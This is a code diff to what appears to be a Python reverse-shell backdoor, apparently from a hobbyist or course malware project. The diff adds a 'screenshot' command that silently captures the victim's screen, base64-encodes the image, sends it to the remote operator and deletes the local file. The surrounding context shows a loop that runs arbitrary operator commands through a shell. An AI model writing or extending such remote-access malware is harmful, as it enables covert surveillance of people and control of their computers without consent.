@@ -8,6 +8,8 @@ import shutil # screenshot
 import sys # use in copy function 
 import base64
 import requests
+import ctypes
+from mss import mss
 
 
 
@@ -44,6 +46,12 @@ def reliable_rcv():
                 except ValueError:
                         # print("reliable_rcv except (continue)..")
                         continue
+
+
+
+def screenshot():
+	with mss() as ss:
+		ss.shot()
 
 
 
@@ -86,6 +94,14 @@ def shell():
 				reliable_send("[+] Started")
 			except:
 				reliable_send("[!!] Failed To Start")
+		elif command[:10] == "screenshot":
+			try:
+				screenshot()
+				with open("monitor-1.png", "rb") as sc:
+					reliable_send(base64.b64encode(sc.read()))
+				os.remove("monitor-1.png")
+			except:
+				reliable_send("[!!] Failed to take Screenshot")
 		else:
 			try:
 				process = subprocess.Popen(command, shell = True, stdout=subprocess.PIPE, stderr = subprocess.PIPE, stdin=subprocess.PIPE)
